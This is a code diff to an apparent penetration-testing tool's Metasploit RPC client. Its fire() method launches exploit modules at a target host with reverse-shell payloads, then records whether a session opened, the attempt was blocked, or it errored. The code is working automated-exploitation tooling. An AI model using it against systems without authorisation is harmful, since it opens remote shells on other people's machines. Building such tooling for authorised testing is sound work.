@@ -367,29 +367,60 @@ class MsfClient:
 
     def fire(self, candidate, host, rhost, port):
         """Detonate the module against rhost with a selected reverse payload.
-        Returns a Session on success, or None. The handler job is always stopped
-        in teardown, which frees the LPORT and leaves any session intact."""
+        Returns (session, status, detail). status is one of:
+          session    - a session opened
+          no_session - the module fired (execute was accepted) but nothing called
+                       back within the timeout. This is the only clean negative.
+          blocked    - no fair attempt was made: an option we needed was unset or
+                       rejected, no compatible payload, no derivable LHOST, the
+                       LPORT pool was empty, or MSF refused to run the module.
+          error      - an exception was raised during the attempt.
+        Only no_session means the target got a real attempt and did not yield;
+        every other non-session status flags a tooling gap to review, so a real
+        flaw is never buried under a generic failure. detail carries the reason.
+        The handler job is always stopped in teardown, which frees the LPORT and
+        leaves any session intact."""
         lport = self._lport_acquire()
         if lport is None:
-            logger.warning("LPORT pool exhausted; skipping fire %s on %s",
-                           candidate.module, rhost)
-            return None
+            return self._blocked(candidate, rhost, "LPORT pool exhausted")
         job_id = None
         try:
             modref = _strip_type(candidate.module)
             exploit = self._client.modules.use("exploit", modref)
-            self._set_rhost(exploit, rhost, port)
             payload_name = _select_payload(exploit, candidate.module, host)
             if payload_name is None:
-                logger.warning("no compatible payload for %s", candidate.module)
-                return None
+                return self._blocked(candidate, rhost, "no compatible payload")
             payload = self._client.modules.use("payload", payload_name)
             lhost = self.cfg.lhost or _lhost_for(rhost)
             if not lhost:
-                logger.warning("could not derive LHOST for %s", rhost)
-                return None
-            _set_if_present(payload, "LHOST", lhost)
-            _set_if_present(payload, "LPORT", int(lport))
+                return self._blocked(candidate, rhost, "could not derive LHOST")
+            # Set everything we can derive, recording any set the module rejected
+            # rather than swallowing it. RHOSTS/RHOST and RPORT go on the exploit;
+            # LHOST/LPORT go on the payload and ride into the exploit on the merge
+            # at execute time.
+            fails = _apply_options(exploit, [("RHOSTS", rhost), ("RHOST", rhost)])
+            if port:
+                fails += _apply_options(exploit, [("RPORT", int(port))])
+            fails += _apply_options(payload, [("LHOST", lhost),
+                                              ("LPORT", int(lport))])
+            # Required exploit options with no default that are still unset, minus
+            # whatever the payload merge will supply. Anything outstanding is
+            # module-specific (creds, a target URI with no default, and so on) we
+            # will not guess. A rejected set above counts too: that value did not
+            # take. Either way we cannot make a fair attempt, so block with the
+            # exact reason instead of firing blind into MSF option validation.
+            supplied = set(payload.runoptions)
+            outstanding = [o for o in exploit.missing_required
+                           if o not in supplied]
+            if outstanding or fails:
+                parts = []
+                if outstanding:
+                    parts.append("unset required: "
+                                 + ", ".join(sorted(outstanding)))
+                if fails:
+                    parts.append("rejected: " + ", ".join(
+                        f"{k}={v!r} ({why})" for k, v, why in fails))
+                return self._blocked(candidate, rhost, "; ".join(parts))
             self._activity("fire", f"execute {candidate.module} "
                                    f"payload={payload_name} LHOST={lhost} "
                                    f"LPORT={lport} @ {rhost}")
@@ -397,24 +428,32 @@ class MsfClient:
                         candidate.module, rhost, port, payload_name, lhost, lport)
             result = exploit.execute(payload=payload)
             if not isinstance(result, dict) or not result.get("uuid"):
-                logger.warning("execute returned no uuid for %s: %s",
-                               candidate.module, result)
-                return None
+                err = ""
+                if isinstance(result, dict):
+                    err = (result.get("error_message")
+                           or result.get("error_string") or "")
+                # No uuid means MSF never started the module: a setup or validation
+                # problem, not the target resisting. Block so it gets reviewed
+                # instead of being filed as a clean miss.
+                return self._blocked(candidate, rhost,
+                                     err or "execute returned no uuid")
             uuid = result.get("uuid")
             job_id = result.get("job_id")
             matched = self._await_session(uuid, self.cfg.exploit_timeout)
             if matched is None:
                 logger.info("fire %s @ %s -> no session", candidate.module, rhost)
-                return None
+                return None, "no_session", "fired, no session within timeout"
             sid, sdict = matched
             logger.info("fire %s @ %s -> SESSION %s opened", candidate.module,
                         rhost, sid)
-            return Session(
-                session_id=str(sid), module=candidate.module, payload=payload_name,
+            session = Session(
+                session_id=str(sid), module=candidate.module,
+                payload=payload_name,
                 info=str(sdict.get("info") or sdict.get("desc") or ""))
+            return session, "session", f"session {sid} ({payload_name})"
         except Exception as e:
             logger.warning("fire error %s on %s: %s", candidate.module, rhost, e)
-            return None
+            return None, "error", f"fire error: {e}"
         finally:
             if job_id is not None:
                 try:
@@ -422,6 +461,14 @@ class MsfClient:
                 except Exception:
                     pass
             self._lport_release(lport)
+
+    def _blocked(self, candidate, rhost, detail):
+        """Log a blocked fire at WARNING and return the blocked tuple. A blocked
+        fire is a tooling gap, not a clean negative, so it is always loud."""
+        logger.warning("fire blocked %s @ %s: %s",
+                       candidate.module, rhost, detail)
+        self._activity("fire", f"blocked {candidate.module}: {detail}")
+        return None, "blocked", detail
 
     def _await_session(self, uuid, timeout):
         start = time.time()
@@ -435,18 +482,6 @@ class MsfClient:
                     return sid, s
             time.sleep(1.0)
         return None
-
-    def _set_rhost(self, mod, rhost, port):
-        opts = list(mod.options)
-        if "RHOSTS" in opts:
-            mod["RHOSTS"] = rhost
-        elif "RHOST" in opts:
-            mod["RHOST"] = rhost
-        if port and "RPORT" in opts:
-            try:
-                mod["RPORT"] = int(port)
-            except Exception:
-                pass
 
     # -- LPORT pool --
 
@@ -606,12 +641,22 @@ def _select_payload(exploit, full_module, host):
     return fallback
 
 
-def _set_if_present(mod, key, val):
-    try:
-        if key in list(mod.options):
+def _apply_options(mod, pairs):
+    """Set each (key, value) the module actually declares as an option. Returns a
+    list of (key, value, reason) for any set the module rejected (bad type, value
+    not in enums, and so on). A rejected set is recorded and surfaced, never
+    swallowed, so a flaw is never hidden behind an option that silently did not
+    take. Keys the module does not declare are skipped without comment."""
+    failures = []
+    declared = set(mod.options)
+    for key, val in pairs:
+        if key not in declared:
+            continue
+        try:
             mod[key] = val
-    except Exception:
-        pass
+        except Exception as e:
+            failures.append((key, val, str(e)))
+    return failures
 
 
 def _parse_check_output(text):
